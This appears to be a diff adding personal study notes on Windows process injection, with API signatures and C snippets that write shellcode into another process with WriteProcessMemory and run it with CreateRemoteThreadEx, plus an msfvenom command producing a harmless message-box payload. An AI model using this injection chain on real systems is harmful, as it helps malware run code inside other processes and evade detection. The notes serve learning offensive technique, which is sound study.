@@ -57,3 +57,63 @@ LPVOID VirtualAllocEx(
 
 If the function succeeds, the return value is a pointer to the allocated memory in the specified process.
 If the function fails, the return value is NULL.
+
+write process memory
+BOOL WriteProcessMemory(
+  [in] HANDLE hProcess,         // Handle to the process whose memory is being written to.
+  [in] LPVOID lpBaseAddress,    // Pointer to the base address in the target process's memory where data will be written.
+  [in] LPCVOID lpBuffer,        // Pointer to the buffer containing the data to be written.
+  [in] SIZE_T nSize,            // Number of bytes to write.
+  [out, optional] SIZE_T *lpNumberOfBytesWritten // Optional pointer to a variable that receives the number of bytes written.
+);
+
+ex:
+```c
+  if (WriteProcessMemory(hProcess, rAlloc_mem, ShellCode, sizeof(ShellCode), NULL)) {
+      okay("Successfully wrote to process memory");
+  } else {
+      error("Failed to write to process memory: %lu", GetLastError());
+      return EXIT_FAILURE;
+  }
+
+now we can create a remote thread in the target process to execute the shellcode
+CreateRemoteThreadEx(
+  [in] HANDLE hProcess,         // Handle to the target process where the thread will be created.
+  [in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, // Optional security attributes for the thread.
+  [in] SIZE_T dwStackSize,      // Size of the stack for the new thread. If 0, the default size is used.
+  [in] LPTHREAD_START_ROUTINE lpStartAddress, // Pointer to the function to be executed by the thread.
+  [in, optional] LPVOID lpParameter, // Optional parameter to be passed to the thread function.
+  [in] DWORD dwCreationFlags,   // Flags that control how the thread is created (e.g., CREATE_SUSPENDED).
+  [out, optional] LPDWORD lpThreadId // Optional pointer to a variable that receives the thread ID.
+);
+
+example:
+```c 
+  HANDLE hThread = CreateRemoteThreadEx(
+      hProcess, 
+      NULL, 
+      0, 
+      (LPTHREAD_START_ROUTINE)rAlloc_mem, 
+      NULL, 
+      0, 
+      NULL
+  );
+
+  if (hThread == NULL) {
+      error("Failed to create remote thread: %lu", GetLastError());
+      return EXIT_FAILURE;
+  } else {
+      okay("Successfully created remote thread");
+  }
+
+in kali i used:
+msfvenom -p windows/x64/messagebox TEXT="I Licked Herta" TITLE="Injected" -f c --var-name=ShellCode
+to generate shellcode that displays a message box with the text "I Licked Herta!"
+
+PS C:\Eva03\GitHubRepo\Bad-Actor\Injections\output> notepad                             
+PS C:\Eva03\GitHubRepo\Bad-Actor\Injections\output> tasklist | findstr /i notepad  
+what tasklist does is it lists all the processes running on the system
+and findstr is used to filter the output to show only the lines that contain "notepad" (case-insensitive due to /i).
+This command will display the process ID (PID) and other details of the notepad process if it is running.
+If notepad is running, you will see an output like:
+Notepad.exe                  22248 Console                    1   101 888 Ko
